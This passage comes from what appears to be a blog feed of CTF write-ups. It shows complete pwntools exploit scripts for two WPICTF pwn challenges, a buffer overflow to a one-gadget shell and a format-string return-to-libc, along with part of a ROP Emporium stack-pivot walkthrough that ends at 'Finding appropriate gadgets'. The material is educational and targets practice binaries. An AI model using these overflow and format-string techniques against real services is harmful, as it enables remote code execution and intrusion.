</code></pre></div><p>And here is the output of the script with the flag -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 exploit.py
utflag<span style="color:#f92672">{</span>0pt1m1z3_ur_c0d3_l0l<span style="color:#f92672">}</span>
</code></pre></div><p>Overall, I think it was not that hard of a challenge but it is a good challenge for someone who is starting reverse engineering and wants to familiarise themselves with the tools commonly used. Thanks for reading. Cheers!</p>
]]></content>
        </item>
        
        <item>
            <title>WPICTF pwn</title>
            <link>https://saurabhmittal16.github.io/posts/2020/04/wpictf-pwn/</link>
            <pubDate>Mon, 20 Apr 2020 21:52:12 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2020/04/wpictf-pwn/</guid>
            <description>I participated in the WPICTF over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - dorsia1 and dorsia3.
dorsia1 The source codes of some of the challenges were placed in a video.</description>
            <content type="html"><![CDATA[<p>I participated in the <a href="https://ctf.wpictf.xyz/">WPICTF</a> over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - <code>dorsia1</code> and <code>dorsia3</code>.</p>
<h2 id="dorsia1">dorsia1</h2>
<p>The source codes of some of the challenges were placed in a video. No binary was provided for this one. The problem description had the remote URL where the challenge was hosted and a hint which read</p>
<blockquote>
<p>Same libc as dorsia4, but you shouldn&rsquo;t need the file to solve</p>
</blockquote>
<p>Here is the source code from the video.</p>
<p><img src="/static/dorsia1.png" alt="dorsia1"></p>
<h3 id="first-thoughts">First Thoughts</h3>
<p>First thoughts were to download the libc from <code>dorsia4</code> challenge. Also looking at the code, the use of <code>fgets</code> with <code>96</code> characters makes it clear that it&rsquo;s a buffer overflow. But since there is no binary provided, we might need to guess the padding to overwrite the return pointer. Also the binary prints the address of <code>system + 765772</code> which is different on every connection to the remote URL. This means that <code>ASLR</code> is enabled but this can be easily circumvented, the printed address can be used to get the <code>libc</code> base address. So, we can control the flow of the program but where to <em>redirect</em> the flow? I recently read about the conecpt of <code>one gadget RCE</code> and it seemed like a good oppurtunity to try it.</p>
<h3 id="exploit">Exploit</h3>
<p>After downloading the <code>libc</code> from <code>dorsia4</code>, I found the offset of <code>system</code> using <code>objdump</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S ./libc.so.6 | grep system
000000000004f440 &lt;__libc_system@@GLIBC_PRIVATE&gt;:
   4f443:       <span style="color:#ae81ff">74</span> 0b                   je     4f450 &lt;__libc_system@@GLIBC_PRIVATE+0x10&gt;
</code></pre></div><p>The offset of <code>system</code> is <code>0x4f440</code>. Here is the first snippet of the exploit script which connects to the remote and calculates the <code>libc</code> base address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)

system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f440</span>

addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()
addr_system <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">765772</span>

libc_base <span style="color:#f92672">=</span> addr_system <span style="color:#f92672">-</span> system_offset
<span style="color:#66d9ef">print</span>(hex(libc_base))
</code></pre></div><p>Now, for finding a <code>one gadget</code>, I used <a href="https://github.com/david942j/one_gadget">this tool</a>. Here is the output of <code>one_gadget</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
0x4f2c5 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#f92672">)</span>
constraints:
  rsp &amp; 0xf <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
  rcx <span style="color:#f92672">==</span> NULL

0x4f322 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#f92672">)</span>
constraints:
  <span style="color:#f92672">[</span>rsp+0x40<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL

0x10a38c execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span style="color:#f92672">)</span>
constraints:
  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
</code></pre></div><p>You can see the constraints that need to be met for that gadget to work. I decided to use <code>0x4f322</code> since the chances of <code>[rsp+0x40]</code> being <code>NULL</code> were high. The address of the gadget can be calculated by adding this offset to the base address. This is all we need to solve this challenge. The padding value had to be guesses but it was obviously greater than <code>69</code> and <code>77</code> worked. Here is the final script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)

addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()

addr_system <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">765772</span>

system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f440</span>
one_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f322</span>

libc_base <span style="color:#f92672">=</span> addr_system <span style="color:#f92672">-</span> system_offset
one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> one_offset

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">77</span>
payload <span style="color:#f92672">+=</span> p64(one_gadget)

p<span style="color:#f92672">.</span>sendline(payload)

<span style="color:#75715e"># get shell</span>
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Done. Solved.</p>
<h2 id="dorsia3">dorsia3</h2>
<p>In this challenge, both the binary and the libc was provided. The same video had the source code for this challenge too. Here is the source code.</p>
<p><img src="/static/dorsia3.png" alt="dorsia1"></p>
<h3 id="first-thoughts-1">First Thoughts</h3>
<p>First thoughts were that, since this uses <code>printf</code>, it&rsquo;s a format string vulnerability. The binary prints two addresses - the address of the beginning of character array <code>a</code> and the address of <code>system</code>. This binary had <code>ASLR</code> and <code>PIE</code> enabled too which means the addresses printed by the binary were important.</p>
<p>Due to <code>printf</code>, we have arbitrary write but what to write and where? First idea was to overwrite <code>GOT</code> entries but due to <code>PIE</code>, the binary would be loaded in a different memory region every time and finding <code>GOT</code> or <code>PLT</code> entries would be impossible. We could leak some addresses from <code>printf</code> and get the base address but we only have one <code>printf</code> and we can&rsquo;t read and write using the same query. The next idea was to overwrite the return pointer in stack to control the flow and maybe redirect to <code>one gagdet</code>. But this approach didn&rsquo;t work because the constraints of <code>one gadgets</code> found, required that the <code>GOT</code> address of <code>libc</code> be in <code>ESI</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
0x3d0d3 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, esp+0x34, environ<span style="color:#f92672">)</span>
constraints:
  esi is the GOT address of libc
  <span style="color:#f92672">[</span>esp+0x34<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
</code></pre></div><p>I guess it means that the base address of <code>libc</code> should be in <code>ESI</code> but it doesn&rsquo;t matter because for placing values in registers, we would have to build a ROP chain but the available buffer is only <code>69</code> characters. But we have the address of <code>libc</code>, maybe we could perform a <code>return-to-libc</code>. For this, we need the address of the saved return pointer - <code>EIP</code> and also the address of the string <code>/bin/sh</code> in the given <code>libc</code>.</p>
<h3 id="exploit-1">Exploit</h3>
<p>The first thing I did was find the offset for <code>/bin/sh</code> in the <code>libc</code>. Here&rsquo;s a simple trick to find the required string in the binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -t x -a ./libc.so.6 | grep <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
</code></pre></div><p>Using this the offset is found to be <code>17e0cf</code>. Next step was to find the saved <code>EIP</code>. This is where the printed addresses are used. The first address is the address of beginning of <code>a</code>. Using <code>gdb</code> and running the binary locally, it can be easily calculated that the return address is <code>113</code> bytes after the address of <code>a</code>. Here is a snippet of the script that calculates all required addresses.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># space between string beginning and return pointer</span>
diff <span style="color:#f92672">=</span> <span style="color:#ae81ff">113</span>

<span style="color:#75715e"># system offset</span>
system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d200</span>

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./nanoprint&#39;</span>, env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc.so.6&#34;</span>})

lin <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;0x&#39;</span>)
<span style="color:#75715e"># stack address</span>
local <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
<span style="color:#75715e"># libc address</span>
system <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">288</span>

libc_base <span style="color:#f92672">=</span> system <span style="color:#f92672">-</span> system_offset
jump <span style="color:#f92672">=</span> local <span style="color:#f92672">+</span> diff

binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e0cf</span>
binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset
</code></pre></div><p>The next part was to find out at what position is our input present on the stack. Passing a simple <code>AAAA%x,%x,%x,%x,%x,%x,%x,%x</code> type string reveals that <code>AAAA</code> is the seventh value on the stack. This means we can access the value at the beginning of our format string using the seventh argument. If you are not familiar with how format string exploits work, I would recommend <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4">this</a> video. The final step was to find the correct spacing to write the exact values on the desired address. After hours of hit and trial, I decided to use a little mathematics and make it easier.</p>
<p>Here is a simple function I wrote that takes an address in hex and splits it into two values that can be written at the required address and the address 2 bytes from it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
  <span style="color:#75715e"># example nhex = f7d99200</span>
  nhex <span style="color:#f92672">=</span> hex(num)[<span style="color:#ae81ff">2</span>:]
  first <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>)
  second <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">4</span>:], <span style="color:#ae81ff">16</span>)
  
  <span style="color:#66d9ef">return</span> first, second
  <span style="color:#75715e"># returns 0xf7d9, 0x9200</span>
</code></pre></div><p>Using this, I split the <code>libc</code> and <code>/bin/sh</code> addresses in two halves and added/subtracted the extra characters that were getting printed. Here is the final script which gives a shell on the remote server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
  nhex <span style="color:#f92672">=</span> hex(num)[<span style="color:#ae81ff">2</span>:]
  first <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>)
  second <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">4</span>:], <span style="color:#ae81ff">16</span>)

  <span style="color:#66d9ef">return</span> first, second

<span style="color:#75715e"># space between string beginning and return pointer</span>
diff <span style="color:#f92672">=</span> <span style="color:#ae81ff">113</span>
<span style="color:#75715e"># system offset</span>
system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d200</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia3.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)

lin <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;0x&#39;</span>)
<span style="color:#75715e"># stack address</span>
local <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
<span style="color:#75715e"># libc address</span>
system <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">288</span>

libc_base <span style="color:#f92672">=</span> system <span style="color:#f92672">-</span> system_offset
jump <span style="color:#f92672">=</span> local <span style="color:#f92672">+</span> diff

binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e0cf</span>
binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset

first, second <span style="color:#f92672">=</span> get_halves(system)
b, h <span style="color:#f92672">=</span> get_halves(binsh)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>
payload <span style="color:#f92672">+=</span> p32(jump)
payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>)
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(second<span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%7$n&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(first <span style="color:#f92672">-</span> second), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%8$n&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(<span style="color:#ae81ff">0x10000</span> <span style="color:#f92672">+</span> h <span style="color:#f92672">-</span> first), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%9$n&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(b <span style="color:#f92672">-</span> h), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%10$n&#39;</span>

p<span style="color:#f92672">.</span>sendline(payload)
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>These are the solutions of the two pwn problems I was able to solve. I realise that the first problem could be solved without downloading the <code>libc</code>, so I would try to solve it without that too if the challenge binaries are released. In the end, I enjoyed working on these challenges and it was a great CTF overall. Thanks for reading. Cheers!</p>
]]></content>
        </item>
        
        <item>
            <title>ROP Emporium - Pivot Writeup</title>
            <link>https://saurabhmittal16.github.io/posts/2020/04/rop-emporium-pivot-writeup/</link>
            <pubDate>Sun, 05 Apr 2020 22:00:35 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2020/04/rop-emporium-pivot-writeup/</guid>
            <description>I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</description>
            <content type="html"><![CDATA[<p>I recently came across the <a href="https://ropemporium.com/">ropemporium</a> challenges while looking for resources to learn <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return Oriented Programming (ROP)</a>. I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</p>
<p>The problem description gives a basic idea of what needs to be done</p>
<blockquote>
<p>There&rsquo;s only enough space for a three-link chain on the stack but you&rsquo;ve been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.</p>
</blockquote>
<h2 id="exploring-the-binary">Exploring the binary</h2>
<p>I started by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is for the main ROP chain.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pivot by ROP Emporium
32bits

Call ret2win<span style="color:#f92672">()</span> from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7cfef10
Send your second chain now and it will land there
&gt; hello
Now kindly send your stack smash
&gt; world

Exiting
</code></pre></div><p>The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.</p>
<p>Before getting into debugging the binary, I would like to state some things that I assume readers already know (if they have solved any of the previous challenges). Every binary has a <code>pwnme</code> function which uses the vulnerable <code>gets()</code> function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a <code>uselessFunction()</code> which calls the <code>foothold_function</code>which is very important for this challenge but more on it later.</p>
<p>Now getting back to the address received from the binary. We open the binary with GDB and disassemble the <code>pwnme</code> function and set a breakpoint after the first <code>fgets</code> call (at pwnme + 114). Run the program and enter a string like <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.
GDB breaks and the address is printed by the binary (<code>0xf7dc8f10</code> in this case). On examining this address, we find the value <code>0x414141</code> multiple times which is ASCII value of &lsquo;A&rsquo; in hexadecimal.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; x/20wx 0xf7dc8f10
0xf7dc8f10: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f20: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f30: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f40: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000
</code></pre></div><p>This confirms that the address received from binary is where the longer chain will be stored.</p>
<h2 id="pivot-the-stack">Pivot the stack</h2>
<p>The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean?
In simple terms, pivoting the stack means to make the stack pointer (<code>ESP</code>) point to a memory location which we control instead of the actual stack. So, all we need to do is make <code>ESP</code> point to the address where the longer ROP chain will be saved.</p>
<p>For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in <code>ESP</code>. The gadgets available inside a binary can be found using <a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>. On running the script on our <code>pivot32</code> binary, it found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gadget which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass usefulGadgets
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:
   0x080488c0 &lt;+0&gt;:  pop    eax
   0x080488c1 &lt;+1&gt;:  ret
   0x080488c2 &lt;+2&gt;:  xchg   esp,eax
   0x080488c3 &lt;+3&gt;:  ret
   0x080488c4 &lt;+4&gt;:  mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
   0x080488c6 &lt;+6&gt;:  ret
   0x080488c7 &lt;+7&gt;:  add    eax,ebx
   0x080488c9 &lt;+9&gt;:  ret
   0x080488ca &lt;+10&gt;: xchg   ax,ax
   0x080488cc &lt;+12&gt;: xchg   ax,ax
   0x080488ce &lt;+14&gt;: xchg   ax,ax
End of assembler dump.
</code></pre></div><p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using <code>pwntools</code>. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> re

e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pivot32&#39;</span>)
p <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>process()

recvd <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()

<span style="color:#75715e"># address where longer chain is written</span>
addr <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#39;0x[0-9a-f]{8}&#39;</span>, recvd)[<span style="color:#ae81ff">0</span>]
addr <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>)
addr <span style="color:#f92672">=</span> p32(addr)

<span style="color:#75715e"># padding for buffer overflow</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">44</span>

<span style="color:#75715e"># gadgets</span>
<span style="color:#75715e"># pop eax ; ret</span>
pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c0</span>)

<span style="color:#75715e"># xchg eax, esp ; ret</span>
xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)
</code></pre></div><p>The short ROP chain is built such that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># short chain for overflowing stack and pivoting stack to longer chain</span>
short <span style="color:#f92672">=</span> padding
short <span style="color:#f92672">+=</span> pop_eax
short <span style="color:#f92672">+=</span> addr
short <span style="color:#f92672">+=</span> xchg
</code></pre></div><p>When <code>pop_eax</code> is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of long chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value like <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>
<p>Breaking at <code>ret</code> of <code>pwnme</code> shows the path we are going to follow -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ► 0x804889f &lt;pwnme+173&gt;           leave
   0x80488a0 &lt;pwnme+174&gt;           ret
    ↓
   0x80488c0 &lt;usefulGadgets&gt;       pop    eax
   0x80488c1 &lt;usefulGadgets+1&gt;     ret

   0x80488c2 &lt;usefulGadgets+2&gt;     xchg   eax, esp
   0x80488c3 &lt;usefulGadgets+3&gt;     ret
</code></pre></div><p>And after the exchange gadget is executed, <code>ESP</code> points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains<code>0xdeadbeef</code> at this stage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x804889f &lt;pwnme+173&gt;          leave
   0x80488a0 &lt;pwnme+174&gt;          ret
    ↓
   0x80488c0 &lt;usefulGadgets&gt;      pop    eax
   0x80488c1 &lt;usefulGadgets+1&gt;    ret

   0x80488c2 &lt;usefulGadgets+2&gt;    xchg   eax, esp
 ► 0x80488c3 &lt;usefulGadgets+3&gt;    ret    &lt;0xdeadbeef&gt;
</code></pre></div><p>The updated registers are listed and it can be seen that <code>ESP</code> points to the desired address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> EAX  0xfff4de88 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
 EBX  0x0
 ECX  0xfff4de50 ◂— 0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
 EDX  0xf7fa189c <span style="color:#f92672">(</span>_IO_stdfile_0_lock<span style="color:#f92672">)</span> ◂— 0x0
 EDI  0x0
 ESI  0xf7fa0000 <span style="color:#f92672">(</span>_GLOBAL_OFFSET_TABLE_<span style="color:#f92672">)</span> ◂— 0x1d7d6c
 EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
 ESP  0xf7dc6f10 ◂— 0xdeadbeef
 EIP  0x80488c3 <span style="color:#f92672">(</span>usefulGadgets+3<span style="color:#f92672">)</span> ◂— ret
</code></pre></div><p>We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>
<h2 id="getting-the-flag">Getting the flag</h2>
<h3 id="plt-and-got">PLT and GOT</h3>
<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">this</a> video since it explains the working with a working example.</p>
<p>The <code>foothold_function</code> has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the <code>foothold_function</code> and the <code>ret2win</code> function in <code>libpivot32.so</code>. Once, the GOT entry is populated, the address of the desired function can be calculated by adding the offset to the address of <code>foothold_function</code> and calling it.</p>
<h3 id="finding-the-offset">Finding the offset</h3>
<p>I used <code>objdump</code> command to dump the source assembly of <code>libpivot32.so</code> and <code>grep</code> to find their offsets from the start of the binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S libpivot32.so | grep foothold_function
<span style="color:#ae81ff">00000770</span> &lt;foothold_function&gt;:

$ objdump -S libpivot32.so | grep ret2win
<span style="color:#ae81ff">00000967</span> &lt;ret2win&gt;:
</code></pre></div><p>Subtracting the two values gives the offset as <code>0x1f7</code></p>
<h3 id="finding-appropriate-gadgets">Finding appropriate gadgets</h3>
